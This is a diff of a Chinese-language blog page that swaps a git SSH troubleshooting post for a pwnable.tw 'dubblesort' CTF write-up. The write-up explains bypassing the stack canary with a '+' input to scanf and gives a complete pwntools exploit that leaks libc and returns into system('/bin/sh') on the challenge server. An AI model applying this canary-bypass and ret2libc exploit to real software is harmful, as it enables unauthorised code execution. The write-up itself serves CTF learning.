@@ -20,22 +20,24 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="1、查看用户名和邮箱是否与自己之前设置的一样 git config --list  2、如果不一样或者忘了之前设置的是什么了，可以重置一下 git config --global user.name &quot;用户名&quot;git config --global user.email &quot;邮箱&quot;  3、删除本地.ssh目录下的known_host，id_rsa，id_rsa">
+  <meta name="description" content="学习与收获对于scanf(&quot;%u&quot;,v4)，%u表示无符号整数  当我们输入整数时，_scanf_认为其是合法字符，并将其写到_v4_中； 当我们输入字母时，_scanf_认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据； 当我们输入+或者-时，_scanf_会认为他是合法字符，同时又不会将其写到_v4_中。（因为+和-也可以用来定义数字的正负，所以_sc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="git时出现“Please make sure you have the correct access rights and the repository exists.” git时出现“Please make sure you have the correct access rights and the repository exists.”">
-<meta property="og:url" content="http://example.com/2024/09/08/git%E6%97%B6%E5%87%BA%E7%8E%B0%E2%80%9CPlease-make-sure-you-have-the-correct-access-rights-and-the-repository-exists-%E2%80%9D/index.html">
+<meta property="og:title" content="pwnable.tw writeup-dubblsort">
+<meta property="og:url" content="http://example.com/2025/01/20/dubblsort/index.html">
 <meta property="og:site_name" content="Qwen&#39;s blog">
-<meta property="og:description" content="1、查看用户名和邮箱是否与自己之前设置的一样 git config --list  2、如果不一样或者忘了之前设置的是什么了，可以重置一下 git config --global user.name &quot;用户名&quot;git config --global user.email &quot;邮箱&quot;  3、删除本地.ssh目录下的known_host，id_rsa，id_rsa">
+<meta property="og:description" content="学习与收获对于scanf(&quot;%u&quot;,v4)，%u表示无符号整数  当我们输入整数时，_scanf_认为其是合法字符，并将其写到_v4_中； 当我们输入字母时，_scanf_认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据； 当我们输入+或者-时，_scanf_会认为他是合法字符，同时又不会将其写到_v4_中。（因为+和-也可以用来定义数字的正负，所以_sc">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202409080000711.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202409080002029.png">
-<meta property="article:published_time" content="2024-09-07T16:16:35.000Z">
-<meta property="article:modified_time" content="2024-09-07T16:19:08.304Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237211.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237767.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237403.png">
+<meta property="article:published_time" content="2025-01-20T14:37:06.000Z">
+<meta property="article:modified_time" content="2025-01-20T14:52:52.102Z">
 <meta property="article:author" content="Qwen">
+<meta property="article:tag" content="pwn 栈">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202409080000711.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237211.png">
 
-<link rel="canonical" href="http://example.com/2024/09/08/git%E6%97%B6%E5%87%BA%E7%8E%B0%E2%80%9CPlease-make-sure-you-have-the-correct-access-rights-and-the-repository-exists-%E2%80%9D/">
+<link rel="canonical" href="http://example.com/2025/01/20/dubblsort/">
 
 
 <script id="page-configurations">
@@ -48,7 +50,7 @@
   };
 </script>
 
-  <title>git时出现“Please make sure you have the correct access rights and the repository exists.” git时出现“Please make sure you have the correct access rights and the repository exists.” | Qwen's blog</title>
+  <title>pwnable.tw writeup-dubblsort | Qwen's blog</title>
   
 
 
@@ -163,7 +165,7 @@
   
   
    <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/08/git%E6%97%B6%E5%87%BA%E7%8E%B0%E2%80%9CPlease-make-sure-you-have-the-correct-access-rights-and-the-repository-exists-%E2%80%9D/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/20/dubblsort/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar_1.jpg">
@@ -176,7 +178,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          git时出现“Please make sure you have the correct access rights and the repository exists.” git时出现“Please make sure you have the correct access rights and the repository exists.”
+          pwnable.tw writeup-dubblsort
         </h1>
 
         <div class="post-meta">
@@ -187,7 +189,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2024-09-08 00:16:35 / 修改时间：00:19:08" itemprop="dateCreated datePublished" datetime="2024-09-08T00:16:35+08:00">2024-09-08</time>
+              <time title="创建时间：2025-01-20 22:37:06 / 修改时间：22:52:52" itemprop="dateCreated datePublished" datetime="2025-01-20T22:37:06+08:00">2025-01-20</time>
             </span>
 
           
@@ -208,26 +210,34 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>1、查看用户名和邮箱是否与自己之前设置的一样</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure>
+        <h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><p>对于<code>scanf(&quot;%u&quot;,v4)</code>，<code>%u</code>表示无符号整数</p>
+<ul>
+<li>当我们输入整数时，_scanf_认为其是合法字符，并将其写到_v4_中；</li>
+<li>当我们输入字母时，_scanf_认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</li>
+<li>当我们输入<code>+</code>或者<code>-</code>时，_scanf_会认为他是合法字符，同时又不会将其写到_v4_中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以_scanf_会认为其是合法的）</li>
+</ul>
+<p>有些时候我们可以利用_scanf_的这个漏洞，达到绕过_canary_的目的。</p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>保护：</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237211.png" alt="1"></p>
+<p>第一次_read_往_buf_写入<code>0x40</code>个字节，接着输入一个整数到_v8_，然后输入数据到栈中，这个过程循环_v8_次</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237767.png" alt="2"></p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	在循环的过程中，每循环一次，往栈上输入数据的位置就<code>+1</code>，也就是说我们可以覆盖返回地址，但是同时也会覆盖_canary_。而我们又没办法泄漏_canary_，那能不能绕过修改_canary_的这一次循环呢？</p>
+<p>对于<code>scanf(&quot;%u&quot;,v4)</code>，</p>
+<ul>
+<li>当我们输入整数时，_scanf_认为其是合法字符，并将其写到_v4_中；</li>
+<li>当我们输入字母时，_scanf_认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</li>
+<li>当我们输入<code>+</code>或者<code>-</code>时，_scanf_会认为他是合法字符，同时又不会将其写到_v4_中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以_scanf_会认为其是合法的）</li>
+</ul>
+<p>​	也就是说，假如_i&#x3D;11_时，我们该写入到_canary_这个位置，此时如果输入<code>+</code>，便能成功绕过_canary_。然后_i_也成功<code>+1</code>，接下来我们直接覆盖返回导致即可。</p>
+<p>整体思路如下，</p>
+<ol>
+<li>计算偏移量，泄漏一个_libc_地址，算出_libc_基地址</li>
+<li>绕过_canary_，覆盖返回地址</li>
+</ol>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10101</span>)</span><br><span class="line">debug(p)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;What your name :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">libc_base = leak-<span class="number">0x1b000a</span>   <span class="comment">#本地的offset是0x1840a</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;sort :&quot;</span>,<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="built_in">str</span>(system))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>2、如果不一样或者忘了之前设置的是什么了，可以重置一下</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>3、删除本地<code>.ssh</code>目录下的<code>known_host</code>，<code>id_rsa</code>，<code>id_rsa.pub</code>文件，重新生成</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>4、在<code>github</code>中新建<code>ssh key</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202409080000711.png" alt="QQ_1725724833042"></p>
-<p>复制<code>id_rsa.pub</code>中的全部内容，粘贴到该处，点击<code>Add SHH key</code>即可</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202409080002029.png" alt="QQ_1725724911246"></p>
-<p>5、然后输入命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
-
-<p>​	到这一步后依然出错，我的是因为命名了密钥, 但是ssh连接默认是会使用默认名称的, 并不是放在<code>~./ssh</code>目录下就会自动读取，所以我通过使用<code>config</code>配置文件来解决这个问题。</p>
-<p>6、在<code>.ssh</code>目录下添加文件<code>config</code>，在文件中添加下面内容</p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">	<span class="keyword">User</span> <span class="title">git</span></span><br><span class="line">	IdentityFile ~/.ssh/私钥文件名称</span><br></pre></td></tr></table></figure>
-
+<p>拿到_flag_</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237403.png" alt="3"></p>
 
     </div>
 
@@ -236,6 +246,9 @@
     
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn-%E6%A0%88/" rel="tag"># pwn 栈</a>
+          </div>
 
         
 
@@ -243,12 +256,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2024/07/11/BUU%E5%88%B7%E9%A2%98/hitcontraining_heapcreator/" rel="prev" title="hitcontraining_heapcreator">
-      <i class="fa fa-chevron-left"></i> hitcontraining_heapcreator
+    <a href="/2025/01/20/Death-Note/" rel="prev" title="pwnable.tw writeup-Death Note">
+      <i class="fa fa-chevron-left"></i> pwnable.tw writeup-Death Note
     </a></div>
       <div class="post-nav-item">
-    <a href="/2025/01/17/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="next" title="SROP学习总结">
-      SROP学习总结 <i class="fa fa-chevron-right"></i>
+    <a href="/2025/01/20/seethefile/" rel="next" title="pwnable.tw writeup-seethefile">
+      pwnable.tw writeup-seethefile <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -308,6 +321,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%94%B6%E8%8E%B7"><span class="nav-number">1.</span> <span class="nav-text">学习与收获</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">3.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
